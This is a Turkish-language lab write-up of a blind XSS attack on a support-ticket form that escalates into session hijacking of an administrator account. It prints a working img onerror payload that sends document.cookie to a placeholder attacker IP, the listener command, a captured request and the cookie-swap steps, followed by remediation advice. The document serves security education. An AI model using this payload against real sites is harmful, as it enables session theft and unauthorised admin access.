🛡️ Uygulamalı Siber Güvenlik Analizi: Blind XSS & Session Hijacking
Bu rapor, yerel bir laboratuvar ortamında gerçekleştirilen; bir web uygulamasındaki Blind XSS (Kör XSS) zafiyetinin tespiti, sömürülmesi ve bu sürecin Session Hijacking (Oturum Ele Geçirme) saldırısına dönüştürülerek yetki yükseltilmesini (Privilege Escalation) konu almaktadır.

🛠️ 1. Hazırlık ve Altyapı
Saldırı senaryosunda, verileri (çerezleri) gerçek zamanlı toplamak amacıyla saldırgan makinede yerel bir dinleyici sunucusu oluşturulmuştur.

Kullanılan Servis: Python3 HTTP Server

Dinleme Komutu:

Bash
python3 -m http.server 8080

🚀 2. Saldırı Metodolojisi
A. Zafiyet Tespiti ve Payload Enjeksiyonu
Hedef sistemdeki destek biletleri kısmında, kullanıcıdan alınan girdilerin sunucu tarafında yeterince filtrelenmediği (Sanitization eksikliği) tespit edilmiştir. Standart etiketlerin engellenme ihtimaline karşı, bir görsel yükleme hatası üzerinden çalışan onerror olay tetikleyicisi kullanılmıştır.

Kullanılan Payload:

HTML
<img src=x onerror="fetch('http://[SALDIRGAN_IP]:8080/?c=' + document.cookie)">
Bu kod; geçerli olmayan bir resim kaynağı vererek bir hata oluşturur ve bu hata oluştuğu anda onerror içindeki JavaScript komutunu tetikleyerek aktif çerezleri saldırganın sunucusuna yönlendirir.

B. Veri Sızdırma (Data Exfiltration)
Yönetici hesabı, kendisine gelen destek biletlerini kontrol etmek için paneline giriş yaptığında hazırlanan bilet adminin tarayıcısında render edilmiştir. Kod, adminin aktif oturum çerezlerini saldırganın IP adresine bir GET parametresi olarak sızdırmıştır.

Yakalana İstek (Terminal Çıktısı Örneği):
[Kurban_IP] - - "GET /?c=PHPSESSID=[ÇALINAN_ÇEREZ_DEĞERİ] HTTP/1.1" 200 -

C. Yetki Yükseltme (Session Hijacking)
Ele geçirilen admin çerezi, tarayıcının geliştirici araçları (Storage/Depolama) üzerinden manuel olarak mevcut oturum değeriyle değiştirilmiştir. Bu işlemle sunucu tarafındaki oturum kontrolü atlatılmış, sayfa yenilendiğinde herhangi bir kimlik doğrulaması gerekmeden yönetici paneline tam erişim sağlanmıştır.

🚩 3. Bulgular ve Hedef Veri
Saldırının başarıyla tamamlanmasıyla birlikte ulaşılan kritik bilgiler şunlardır:

Erişilen Rol: Yönetici (System Administrator)

Hedef Veri: Hassas profil bilgileri ve sistem yönetim yetkileri başarıyla elde edilmiştir.

🔒 4. Savunma ve Önleme Stratejileri (Remediation)
Bu tür kritik zafiyetlerin önlenmesi için uygulanması gereken temel güvenlik standartları:

Output Encoding: Kullanıcıdan gelen veriler ekrana basılmadan önce mutlaka güvenli kütüphanelerle encode edilmelidir (Örn: htmlspecialchars()).

HttpOnly Çerez Bayrağı: Oturum çerezleri HttpOnly olarak işaretlenmelidir. Bu sayede çerezlerin JavaScript ile okunması teknik olarak imkansız hale getirilir.

Content Security Policy (CSP): Sadece güvenilir kaynaklarla iletişime izin veren katı CSP kuralları uygulanarak, verinin yetkisiz dış sunuculara sızdırılması engellenmelidir.

📌 Notlar:
Bu çalışma tamamen eğitim amaçlı bir laboratuvar ortamında gerçekleştirilmiştir.

Gerçek sistemler üzerinde izinsiz yapılan bu tür eylemler yasal suç teşkil eder.
